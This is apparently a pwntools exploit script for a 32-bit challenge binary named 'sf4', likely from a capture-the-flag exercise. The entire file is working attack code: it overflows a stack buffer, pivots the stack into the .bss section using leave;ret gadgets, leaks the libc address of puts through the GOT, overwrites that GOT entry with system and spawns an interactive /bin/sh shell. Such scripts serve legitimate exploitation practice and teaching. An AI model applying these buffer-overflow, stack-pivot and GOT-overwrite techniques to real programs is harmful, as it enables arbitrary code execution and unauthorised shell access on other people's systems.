from pwn import *


p = process("./sf4")

read_plt = 0x08048370
puts_plt = 0x08048380

bss_addr = 0x0804A048+0x500

read_got = 0x0804A00C
puts_got = 0x0804A010

pppr = 0x08048599
pr = 0x0804859B

read_leave_ret = 0x080484c4
leave_ret = 0x080484d5

p.recvuntil("Input your payload!!\n")

pay = ''
pay += 'a'*0x28
pay += p32(bss_addr + 0x28)
pay += p32(read_leave_ret)
p.send(pay)

pay = ''
pay += p32(puts_plt)
pay += p32(pr)
pay += p32(puts_got)
pay += p32(pr)
pay += p32(bss_addr+0x28)
pay += p32(read_leave_ret)
pay += 'x'*(0x28-len(pay))
pay += p32(bss_addr-4)
pay += p32(leave_ret)
p.send(pay)


libc_puts = u32(p.recv(4))
print "libc_puts : " + hex(libc_puts)
libc_system = libc_puts -0x24f00
print "libc_system : " + hex(libc_system)

pay = ''
pay += p32(read_plt)
pay += p32(pppr)
pay += p32(0)
pay += p32(puts_got)
pay += p32(12)
pay += p32(puts_plt)
pay += 'xxxx'
pay += p32(puts_got+4)
pay += 'k'*(0x28-len(pay))
pay += p32(bss_addr-4)
pay += p32(leave_ret)
p.send(pay)

pay = ''
pay += p32(libc_system)
pay += '/bin/sh\x00'
p.send(pay)

p.interactive()
